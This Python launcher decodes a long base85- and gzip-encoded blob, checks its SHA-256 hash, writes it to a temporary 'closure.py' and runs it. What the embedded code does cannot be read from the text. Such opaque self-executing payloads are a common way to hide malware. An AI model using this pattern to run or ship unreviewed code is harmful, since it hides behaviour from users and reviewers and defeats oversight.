from __future__ import annotations

import base64
import gzip
import hashlib
import runpy
import sys
import tempfile
from pathlib import Path

_SOURCE_SHA256 = 'f65ee840f8429b91efa0d07e95e97113bb82e2fa8b181ccf9b8b9fa963343519'
_PAYLOAD = (
    "ABzY8O(}3{0{`t@|C8IcvH$)43Ranp?^;R57lH(@&z*4+r}4bh_QY=A>-gQUAPL?vmPD1Le7V~G-`_4kQY1y`bY~"
    "|`TDQ~sBmxUyu?u`Yiv{(?Zys*S;$f7n9_rOwXMIy$<tu)Y7WvW%!*o+^3LS<{wp`~$<*3yvuT+)gtMcUJ3#Ztm>"
    "AADY|DjG!ni9q3S{0>kK3}QwYLP|F#~;dkWreR*g%29ZFW{qnP~EJv)n)Vj<JHZ{$v2Px{PerOg-^eB9yya(ZA!J"
    "6<=3m(y2xTZdz&vdOFc`nLdV!Oc$lp!T`2Pj3gwrDT0)6<k(V%>8NHglrIVAtKKcIZr(eASnWrZX{AW_=A3#D_=z"
    "OhL(1$S2m+OVDbP_^qp=m9&t%aS|!cJ@9#EM$#_)4v^a#@D-D#X^#PQH5l?D?~&Up@XV{PW|d&u}P0ku;72KcPxW"
    "mP*FBC%jnDR78;^LZpJbn#;+_H&32~U%q%5K7aNk{GZ2vgUVt~PEJk|ojOZhLC;D%h?T|xz^tv#oph0_%6acR%U6"
    "18o|adtSnIJTOZ8)z6zV#Gk&Zn_iTPVyj6F-WF2}yt$)yh0x(J)fVYJ>Uc;?Lh=p<QOy)LU_+Ix6$Zp7H(IPc5{q"
    "uuQwC+D3JPq!uPK;fzVqw}OYP<Y<`*eTWY7)msMcAnyZ;R*iJ`F3=;P;B&jTkiu*;j_Pd2Nv<<)%Q=odI|H|%%;(" 
    "fbLjuiPEP*x{qw)PczNzDva));RU$ae#RbTEZ5rt)?y|@?>o7~8SCiUpbee*n%?e#^78N)V^zTxyVm;~Vtg+@0oD"
    ";P=$yQKnX;uPo1$DW~%PNbzb+WSDU{T@n&bMpS=+;84-hKq%3H947!FIzdtxW%XFV>QHo=Owu>xd9a+%%#-OJhR)"
    "Ac|-ZL^ASvje>|Ot8SqFcGTvH0!O_mvoZvOV8Vj}r@aEEP!O{yO<Bxbl}afC8Of9p>O~QYluyAmX~emkM9fcQqE!"
    "@Y9=S}AKndmt@uVm6Y})UFRq??N#9T9>v~&ZH3(waqiW5OSpGIyFaqTC8;+#t^K?Ny~rRV!3@)`8g^HYz|!yQ<w8"
    "}P2=U=IY<ZX_57oqIy1)J>`4I@Ve%MuW)bkqERaB+(JH?Ypp0K_3(C3l%{})4e_T(DlxIQ^b0Al3=MuD?l5WJpb?"
    "ioecWFRK*)z;lr0Np1&GCjg+ZJza2g(^6S$2A8byhz6&b!2Bp4y_0{YzFTZ}Z(<^H}MU|y!rp9-q2z*8YCirx>=m"
    "G6o4a?Y-Ng4$d<}D^dE2Rlcdf>(|w`uIFL}>VL5`+Cm8a9YH@)MN=5okFIlF5$P!90H$jO@v)Z|^uV;Zpw|Bl8oN"
    "1_G>xyRM9**wry3sSmc9NG4oGV)#B~5djOAek8aAhbAeZToESYJB_SsPO(}gS)wWp8}?>}6Wm*J6zu-6i5KBzktJ"
    ";r(k-G3vz+1bQ^vVn;_|!<^VQ;}yT0f+U*$_!o_B5cu>C}^v|XY7;+9jd@MP|C5lkI2_qacGW@OGh=}sM2%o%SMd"
    "d}xmo{da~ipsoL;{x0f2{K&bqcA!rj2fY^Izb~IlXJ=%sWUeB=$KR(UzM#kYD8|prIE`6X5}&$IxA!_XQGwM=RO&"
    "eTNNrpf!)n+q*%IHEDn~sn{AJ4oqC+2*12m3!UDokL313S9S3D|BJQGfK`AlXVV-BT0~-|x6%rKP(T>aSrgcHMYq"
    "jo+dNw6Nt-EvLcjQX;Gikl+cToXbb#--DU)bspAa$N*m5LTRO!Gxj_FZ>WKVx<1*r1wc?4wr4gMDT9=qtNlU%PtW"
    "z&ce_FtuYq=V;wqWE>`XQK>M_p#19@n!T`gOx=syMmH`&)Slq^?BWxte!L;dY*zsp-m|NWSm$Eowys{~i)E;iA2u"
    "bj!FBjnEjES&yoUBKoZmTee5#;9b+Ze3VK-W4NF4!fBW%b0#<EY4Zt-xcmf7M4wkxm=q$*wd0seXey;%ar&cL>y_"
    "BU!#b{j}lwm{|{FH~9Dj-Kpjcd>yjv)$6dy3P<jwX6l0LKbJRq~7c++7PLI&+7#P1_c(pg4M~)%|2loSh%GGyCv%"
    "Bs#SfM;auzN@(L8&ix9w;4{V@9@iXko&0)S{iiD+JSOH^1$8*_`=y*NuvxnzciXWs>E8+s`<{n8nRWbmW7$sB)1X"
    "IAGj^jBs$%qztghr1I$bfjTEu|?*n2Nbaqm)zTQ=a%F;5>n*0!h-YdVg79J#gvAfOVg^f$y_G-UHGGEJ_&TG0u?m"
    "i0c!QBqWjCjRGD~*8^I_TptiROQjNiL@Cn=liE*#80p}r1?y&Hl2Ue$kum8Cj{?bKN#X*bjun`n>jSscU=4|KgIL"
    "Oha3+N-6ip)~qLfN7$0Qa$^FAF|r*{MErNW@xu00yCldUdstz!~V67>ZmgM}Soy;-*L8DMRoDmz7LJXA{=FEX-Yf"
    "A|zcp@D2249Hy1Vn3Hj`!9!e#i8DuAdDpj5zZ)wEq4@M+7UMb>D;9h<iNh=TY|tz0NWtrwKz%zau7NXytDmaaSNx"
    "VLAroUYvgNt$Ad;(0OA+`YT=HFYax2r@8+n{(m4%0iDCoc){IG*-qwvVRyXF0PwRN2(?YHOn6&JT2f`R#J1qvD5F"
    "i}xQPV<vQ&A#aLp{0yiX)9UBb<r=3LG~t%=68>Aen6Cv8H>JL-)An%?1DHc_DM(6~+iWw>APFStxHhPqFh%^0|=r"
    "TsH2>HAVoqcLxAIlyRd~v5%xQ&)hK)d6`w&Tib~~{K3_24y!Ex81wv<3=?B!KQ+TyYPG6y{vyAIjU*6I5KNNza!*"
    "ie%MAK8Xb_Cm0Em?(8vyU^Ap=YxE^{9-f%|(+1Aez&6DG+~y@u7)W$sb)aXgJV9l}v_q-LRSeRS5~@!lC)2aksqY"
    "+C}fg&Aj`m;tTyr836a0EaCV`gQOcXf4f(B@mmc0Ex4FRqAS%E!P{+#3!ILVwcW%x6>J5GfW5EjdkLQIC5j^#w3o"
    "Zj+2<tSP2SnQpW1ubcRsrrh(_XN$LV14V3n^B-&5llM7S|;H#F3`k(2{XFBtl&in%Dj16fc=phy>f)m5&8VpZ-i<"
    "{j!IfBk0{~#V#^raQYe1mgo13d}iT;b0tKMFRxxF<SzjuLcw#~ZRm%}jXiJdpohbOs>0)gR>+!gGrJu+KkcKA+2@"
    "W(5Xf2?1%@hd<=30_K>x$IS}y%t;xSq9cyAv%(F(0M1H2lbL@t$_ED`{|RJ<9|@j+3NiyL1HBt9@Mv%xEtnbSB|i"
    "z9f%VS2Ten?2PCByNuo1|kW~AW;iN*{+GtXvH?{}ncvIN2_z?J5FZ=8M&N?SO&O=5%2OExy6TYS-P#U-~F9yWsHk"
    "o#kPkZK*4>aB$vxWutB@v6wGD_A?TIK-qoGhMYg65stK2lf3?dgLCe#8C?3-$9quyO%C08Lc?fC5H9xqDz3S<mV^"
    "lEtw1rnG6k?3~Ms^OXA|&*{`xCmR#iJFP*TL+2smodd=HYSmAo-k409#nUxjT+AXa8$F)gd4wredS*X3tUG6e>c?"
    "5G0xF(V33!z8=R2uNK1X2+w9<US`lj{ME_kuLKH*=2@-wl{@DW)_gk&+RKBG2WR?<TZNBB8lpH2KWjKQs5w%>9?g"
    "+_{kU05V{1os5P@U@mLus>%Eb_>sij4}8Pvq*tG#QT!}HtdZstWWUk_G<p<8q=Ff7%ndr7qm0$^Jd-cP#GcH)UoU"
    "effv|~;#H#};3?nSutp`qhlPD$UZg9-B1g_v_THN}0*dv(9*sx!YVFJqKoU@~*#rKHGwiI=?rR`kMbj~%MlkVJSp"
    "PBo={1}qE@;`yOi{VM&Ps-fubVIYiS)*q`aB&+AZfm(znsa<c1;03!3i~3UpNPS?9ift%j!;j?<GYVH0&IGS^p5U"
    "6ap})_Flq65Lxm8Z_s$~`pN9sY|LTa)9g;VHW=^!;M2jq*smsd($E;_SdZP<Vjx5s01I`NXRUT$V_7vI9nynb7TE"
    "Prt3nV6ESJJvcC`*up=ig3{5}zv#49VqwpcM0zq8{O%47jhOSSy_blu?x&N06@b;*IHau~}K2a1cg)mr_1ho`!H6"
    "nk16K-np;XKeP40TV7NWpKwb2!1ZD;iPJRl0|J=FB_iOd%i!-+`%?OGoW?4qzAu?dJYObmEV%mUi*5n&0LN=Vh!^"
    "|N4;4hQ8ziod-BbxGfZ=c;G$aj@fI!PWQ9&x0lIH5vFY=lhuydQgy~`Z^VK{A)N2M;_VqsmbG1f9xYj_E3TPs_I*"
    "V!sT;~A+oyxL|KBv>E{{f~_{3G62HHDI?p!vWt5^GyZIv)<p@-3W1^uD2t;jTlD4Pg$(EOQY2Dfc-^akTLg#PF3V"
    ";!Q3bUmjt|;FaiA0^L;M-fF_y{t|Nbh7=FZ#c&DxlE)-`$l%zrdNfl`t$N(sO3RWG!h8_WxCB8>Rpi{1?jCDl8r&"
    "HHgJW>h2L)Q;eS~mK$4rXe+#b9sq!$zp%4VcF8X58&G_@f!-Ew_^_@c-B=Orvb#Q{6NBm5gMZ$PA!UAM*|#-r+h+"
    "yRnC6W4HTreW_(|)x|C@AAiH8UhrXc>;iz}&`9@95(`kxY@se^s=Qeu<GlG)m*FYKGzQQEzB?i~>jC_aeN8Bnfz*"
    "t}iJ$t6YvrfH4U~3;QVCW3{@BBZy;U$O-NV>Jx-P6_ba<$7JoaD_B{WKeR4J^7n&CxvL;wju0N?YNR7n&mz&C)c@"
    "IJIhrGSCQM5RPao*u>?t>O-%4>#4Y&Zb285f?nwLdrDZ+*g`wz(p+3krpBW?MkMZ>v`PuG=UYG5v56b8~njHmmKU"
    "s61y&ihA_bH0v6*U0T?EuK%^0O1(k{9OvIeR_C_@9Ca^~Y0DAz8rPP=7S8>ap0f`$L({~4Vgj*3o1Un_=am2isE6"
    "|0IQ3MK7N(Y{#m}w{_%v0opwZuNSgcorIkWnSXk3Df$MDX?VKRx+~?#fsRMO}c;sV17H0O%O}7vOEcl^?Ox4Mfc1"
    "G-0mfU|ItFSOzdUN)rOC|C6DBPq(9g_iwYK-!iwq!Y#eC4c&F(@-;45n^jh2W-A3-9O<EX)6P}ioUscp7>mBC1W*"
    "7H8dDOZ(w-QN^r5(Nk#A!@J_+anflXO#o4LN+BN8YJu0pzqvxUaE2Sx|%n|Nk;`$ZmT;y_)_<}TZ>lwqQaBmrZGw"
    "KJ@Os{lWwr(p%45WaVt!ggALt&AKBnr@pr=F0kg;;)`Bf{|(lTmmQ@n3?3kZKeB@Oz~{uqnv-o9T>mW9XR(!@0aY"
    "j1Hd)n9pMgO45LXtBkm9|&-3o#4noW&yPrD<I(LKP-N7Rs_3q>jBp`U8cf30QCS^?C(H+2p$Y|cx0e7IE)EzKS`B"
    "-1zfuQtGzTit(CO+<DtGja?UL`teIOuSPl{+qF|FO(OEf$WsQsiKOD=T#3m`Qdbz&1(gG%@wb2$7utNmTguzC~LM"
    "Unu7Qr_AHb%#j0d%Bg+8vD%&7=cvKHw{Z7Og2*;QV4GpfHp4#f>+#EVp@9_Z=B<K1)j34_dWde@Kl#DIc4`iuDqP"
    "erJ_Mkfud*1Fim#PCHSgp&ck&3;ZC)!F-Bh~ly+m+3HCSbyY?kZNR-8H|vbHz+rhN3OFrPJI<ti`AN2inN1Pt?ha"
    "yE7J%H&|FGS0F`MzLE|{(EQge=9pHXLA^2p6Jubrb=gWa#nZRl7>^j=jz;c&~&w|ie5+S_h!yJ#n0wf`o|=@)Ma("
    "rNQ16hsBeN9<*AW{(HSeOjY*pTMCm+o-r@WB%)2Vg4KI@{W)4J5Y~q8dg*H)C&O)zF?F$CaoJWrwulwv>R_W#II<"
    "9fyfQ>l#jgze$Tjc{*88kl>UJGgCFr#vI+XjC>wKaDv{ldvgYwRPU&c=ld>C%Ps$43r1zWykoy1-uFLC9Ft=i>P4"
    "JB!eG-P&#JYfwWB&eaw(cz>jIp^N(co6(J(KeV3Sw4d7sMkdYFtHVzKp~3<wrCC59nO?UJQ_E`tRTpNly~CJJwya"
    "pKx~6~)t#0<)$v)M#TN88>!x>qgpxYRmvf5}ijBrcXtk2db*ux<<>U#}Nck#MIt}kBOPz!vCj1T_lyw~)itq<0Cj"
    "EFvc+$Rjxdxs9yXYwE4nH@o>e_I@9;B<RbFzp1}&pOj<-lEzbXEzDH{i(4VQSZC$elz$QHksZxb?ms@80_DBw8-<"
    "`XN>zo!Kl<#-!@ixhzD(p_Jn0!<jdTEh(``?D%}-+yW_r_pexqkX9bIi2`Z0x4=QJk&X1AUu>u{G)Cy%?p{qt8Ro"
    "@}Hg8Pot71`gYYxx6e)V9@nk_n}tA%y6M`x6@44vhKWC=wj+kh`ZtThFci6`Y}YF<7?5sHk3oV)l0HR?ojfAH|+N"
    "j$3*7Lk?i~s7{Ux81Grr8Lwj@4VXjS^r=eMMCwvw!u*b~4%oA_%OdigsBM`sX|f|tt=9`cdzcw!F=Fkj199+VOj6"
    "L1w6ZxifT8<d-;>mTG$s<$U0ay|<KN<45yP5C1;R2iDy8f7{lleEG2PYYRy!L8-nJ^(yHxEpt^HMY%&S4@J*6B0H"
    "EiYxzPZ}&6u3*kT2TRp+-}t8ZEL`VY?c((*n>r!EUmu*CYV=^xb03<>lm3|EoCnx-L_W?9fKAZo$ldi=3uvA;eAp"
    "#7Id;5vq&D)U4QO&W;A`S?vkz7#`6(hx6j5hYq!I$xdWPf``u_uNV&__CSeuG^Tp}5&M<@aq<?BrZ+liLwS9DL`3"
    "UpC;<)1?Q`1Sq9|i}q<1AvYdG%{!71PSr$d-B;>7s03r{0II+sWxY+=Eoxx{dkl^!?GJL65flcaO#XOFPwI%6-l-"
    "()+u4#m;Ga|BLBZ4KrV+sQK$t7(b>Wesb%_i*~Rn+VkSmhWwp7{TKQ7!vl+KrTexx`NDY)K)9R1;B?-s<8*$V!fA"
    "gCqalIaNLKgnFTQYI)%**DmF*qbJ;ne2_rF*A$1W;KCpOn(_gM5@`)eK_dga?_j)SXKr+oi+Gy0V(lh5WLU+y>3X"
    "!G@hs!n->A`dRQwI>FRIMx8Vm3u!au+rB~8zLwlBFDFv4IYwVv6|1|N%+Hsiu9r!E%yBROGm}AE<25;s{hU&P=}o"
    "$$FOwAZo-3+b%}h4CG6@CqkKqNPgqT%cju!14U`Xq$=o;3&vK{zO_Z%C;?~+@7EXtUZ_vhJeJGv0$S%>KdQ;GbUo"
    "G64IxRhzHYju2!H84GCOex&C)Krj<_FC9CE{0oc{58@j1?R8?W^+M`4bw1^WJ%d`@wtXMUerwT0<A>?c@E{HR>p("
    "^S&oxHk<YS*LgSy4ZnB(Y8}@83dh5?g{RxFtFuihf(L`p@RvF8U7Ndyz}Qg>(58jAB>>J6t#NaC1ykbE-#S(92>1"
    "sL@H&Hv17Si2Si}=S`=ck&;^R6L+?|>BH&MF$`u%7)de4a4xAHojOnb+?mkQc^V*YL4Pc<^`S6?~5r!JjS`CI3qe"
    "VOGSoF}io#c#>nC-|*-mm-c9Olea&9(cu2&i1y6V@@3$t>P>E`I+W0pvl9ZI@n~(r|v)Q_M)|8u2>&ESP5hF?5KQ"
    "6>aluaE|~q&Biu~vZtaGwHm-yB1V)|f*pa;KUT1djc7$VYN8niME6UFHit=ucu<L7Nv<@uI*%E8k)HbndHipabO_"
    "yjL$U)VmwpB{!ZRvaob3GZq=m7R!8Wb0yXMn2~YE`CascnhvRfzix{&ADn=$O1l{K2AYXy<FQ<JPO#?vQ=zJ@grY"
    "j?HYgquC{JbdD;Pe{ed#K;cA-JbnZAu_NT^a#_2%_3#<}wrQ}J@_6h}UUVTtlk|9p#pfBAuQ|Odo$p}QYz_yoSv>"
    "4(j<EmW)Q6Mx(OFrODEOj1aN8YdrvrF5XU|q(gLvbE9c}|(b+%JSZIY}yumM<G{=Qy}$JX}q=G!fiXpnWgKTmpr_"
    "Q}PTQWy}|Am9{Qv`pp!l5^O-q3w4MUOayJ@<EHqA6NkJ;KI>(xbfhd$4|d|00rw1sTBwatOuzFXL>_o|9l18LKAv"
    "-ni!%z^qg*^UDoert*crj`|zcW=niCdLR3a6)s=R3UbVi(Q&W4miiL{&3e0yb0AY*(;|{YLU~QwSRx5Mo6-a1>f;"
    "?3jIKRlWk-ihs=#L1czzUWv7S5IG*k!Z!cXvK~8Hm|Qc4Q8B67+4`VHl-zofj}~{XGQ7K5{rcI47N{YXyeeJ<^^J"
    "OAkMT!M|vsz99f>r0-+e9ey^dY%$)JFeJIQ0hICzRxhLCHRk*xG%|D1IVlD}I260V{jEfth)e|m)k4pmr&e5P<)I"
    "zafZh_AE{_=s1gH!1ySgl)XQp2juJk5$U*yrI1Q<GZ9#`f98BV5!R;2@4G}e}EVx8<9Wy3yfe!j3qBK3|5hKy$t<"
    "yyxX>>aRI|6>DFV_?Dc6&`Eh#HQwc4dUOSShJsX45a(h6m#cWSi-@m`r0%bY6*C*1jr4GU$xuWc0)@Q=nQ>Ltx$("
    "q(VGiw4Bc_9fVrSgf~JKN0p-b8+PPLYw_4K^XynGm@@7zHW*E~f2S|kgrj83a|I|g^1^(NgK%6^9!cL-bQ($HyFE"
    "$KRkGQ7WhlC#C1J5?#(m=J472yjRZZ&-%G7axiah*%D%FWUO);mQTOU%C}$JwzY57x>SV%gsXneNzCo>xHO)!KMJ"
    "QXzxY?0qhK0|%V}9srX!%g#f1{t)9S^?EyX?1DSpX9ZJ3hd?~oWP3V>D-50p;Ok~)t-auKvI5al<2R_{W0Z+ID5w"
    "McDBfuE^PS~wwSX=*ghV?v&PX%80GMaDb;KKakznsFEW$2<;V!b$ZbLhxy@K|ya+F{_)L?+AQ-9T<&$JGBOly49f"
    "Ufc?ORMR4#(QmmQ?q=dTy5M3rV5tBC|g-?%G1v3SceXFS39+-u7K{A2IZqQmm5U<_KhJ2P50ttCuW2xC38FhIyKw"
    ";S(9aAgGko}0E7_fT!=X%r#La^=I2zw4hBgk+r$toHMdpGW1C>od4%#1ju?4!{0p0{(@`d8bzKblZ1F}nSEcSGPE"
    "(vG;CzqjJeYcX^-q_ArJwF}4c6ZRPtoh2lAS*;E;ooMUYIARXPshml_a66pPx=<GrNDxOajHUO$aj?JqPQ-YPR0s"
    "?_U<fYEu&seuNsW6Ag+>jKI}`%s(iqtUH#aCisru%sa8CGv_yt9G9RyVPZn7G+56H<A<;_P6(#w3eT5;iegaE#4O"
    "mR2s|E&w5seJhbXW(=j9C)SU&kN8|uSZ!mbEw6`&CVCSnDpT{1)Q;4Yx^m)}0F0p(6!k@?ofq8<%1NIHk)g99IXv"
    "fiGQ_rv}5bTnZrjO%ZfrzWi0WY(CIr;D>5zBY~4IRQ1)#>|v%a+|qiX09u>vBqA;UaLVo?H(w#f03fjFI(En0R2d"
    "0w<PA#Av9>RIw!cQ&bE-WT{C8NShVf>NFa9GF1||+c50*0Ym=}z_#xow@H$)f{HM-q>6C#Du7Y(5Mep7cLGAYs1i"
    "&@+<Vc+zI!rk02Ry@%zL0`K>N7`NT+B7(ks@|i4(+Zy@_c)2-~N2pPLXD#Hb>`UB`}Y{MsG**DmxalsTx}t7FsL3"
    "CY2ZA!sIyEt>T~Nh;>-BJ)E!_?q2R1oM4RVtxrJDt?TT0-U%RM3P$^3U-2rh)S@;t>yn+4+hxFZ4i*D@0KWGgWwR"
    "_8J2ZcdG>oYb^&5cpymss0y_s8Y>m0tR(@jC%Ci~VA^yc@RJL!3yrR~2uYU&ojb$^?tHaubNpJame4%FQ_pz2qyb"
    "!r9Jz0U5i<=lS4A7kh|oG;(N7qIykus=2lvHC|?KEnJ>XE$v#77dEPt)ZWj+dMz(=2&5<p)hH6?@sm|T<%P7bA`5"
    "-fw;rL+XC?C#m*ZI#%|Ug$iE!MHn!JkhiQw0lI_h)Tdw{%EH#ojzAy8!V}vKSoaTP0p<|uJHh#vqo1Bc5hETG$lZ"
    "V?|wR4<Q1a-Y>zpZwS!Ru*nWDG2&ZyRT~$+QESFD=T$zt8I5v0r5=?B-#6P`ZuKA(S=FVABU`OTS#?(dp!OEwt?b"
    "s=lyo!0w#^#Tb&b2>5Icdq%cCJ^SD|?^?k8`h4bJe3<n61wA_50{VUf4QL*pozCE!yVkR&{t%a2Oy4|3v<;{<G=M"
    "$~@i>1H8cY+0lk>WJ2*gkRA0VeP8xDd100"
)


def main() -> None:
    source = gzip.decompress(base64.b85decode(_PAYLOAD))
    actual = hashlib.sha256(source).hexdigest()
    if actual != _SOURCE_SHA256:
        raise RuntimeError("embedded closure source hash mismatch")
    with tempfile.TemporaryDirectory() as temp_dir:
        script = Path(temp_dir) / "closure.py"
        script.write_bytes(source)
        old_argv = sys.argv
        try:
            sys.argv = [str(script), *old_argv[1:]]
            runpy.run_path(str(script), run_name="__main__")
        finally:
            sys.argv = old_argv


if __name__ == "__main__":
    main()
